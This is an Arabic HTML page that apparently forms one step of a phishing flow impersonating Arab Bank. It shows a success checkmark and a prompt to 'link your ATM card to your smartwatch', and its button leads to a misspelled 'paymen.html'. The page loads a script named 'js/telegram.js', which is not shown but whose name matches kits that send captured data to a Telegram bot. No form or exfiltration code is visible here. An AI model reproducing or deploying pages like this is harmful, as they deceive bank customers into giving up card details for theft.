<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ربط بطاقة الصراف</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            width: 250px;
            height: auto;
            margin: 0 auto 40px;
            display: block;
        }

        .header {
            background: linear-gradient(135deg, #e3f2fd 0%, #f5f5f5 100%);
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 50px;
        }

        .header h1 {
            color: #1a237e;
            font-size: 28px;
            font-weight: 600;
        }

        .success-icon {
            width: 140px;
            height: 140px;
            margin: 30px auto;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
            animation: scaleIn 0.5s ease-out;
            position: relative;
        }

        @keyframes scaleIn {
            from {
                transform: scale(0);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .checkmark {
            width: 60px;
            height: 30px;
            border: 6px solid white;
            border-top: none;
            border-right: none;
            transform: rotate(-45deg);
            margin-top: 8px;
            animation: checkmark 0.3s ease-out 0.3s forwards;
            opacity: 0;
        }

        @keyframes checkmark {
            to {
                opacity: 1;
            }
        }

        .message {
            margin: 40px 0;
        }

        .message h2 {
            color: #333;
            font-size: 22px;
            font-weight: 600;
            line-height: 1.6;
            margin-bottom: 10px;
        }

        .next-btn {
            background: #2962FF;
            color: white;
            border: none;
            padding: 18px 60px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            margin-top: 30px;
            box-shadow: 0 4px 12px rgba(41, 98, 255, 0.3);
            transition: all 0.3s ease;
            font-family: 'Cairo', sans-serif;
        }

        .next-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(41, 98, 255, 0.4);
            background: #1E4FCC;
        }

        .next-btn:active {
            transform: translateY(0);
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }

            .header h1 {
                font-size: 22px;
            }

            .message h2 {
                font-size: 18px;
            }

            .success-icon {
                width: 120px;
                height: 120px;
            }

            .checkmark {
                width: 50px;
                height: 25px;
                border: 5px solid white;
                border-top: none;
                border-right: none;
                margin-top: 8px;
            }

            .logo {
                width: 200px;
            }
        }

        @media (max-width: 400px) {
            .success-icon {
                width: 100px;
                height: 100px;
            }

            .checkmark {
                width: 40px;
                height: 20px;
                border: 4px solid white;
                border-top: none;
                border-right: none;
                margin-top: 6px;
            }

            .header h1 {
                font-size: 20px;
            }

            .message h2 {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="شعار البنك العربي" class="logo">
        
        <div class="header">
            <h1>ربط بطاقة الصراف في الساعة</h1>
        </div>

        <div class="success-icon">
            <div class="checkmark"></div>
        </div>

        <div class="message">
            <h2>الخطوة التالية ربط بطاقة الصراف<br>في الساعة الذكية</h2>
        </div>

        <button class="next-btn" onclick="location.href='paymen.html'">التالي</button>
    </div>
    <script src="js/telegram.js"></script>
</body>
</html>
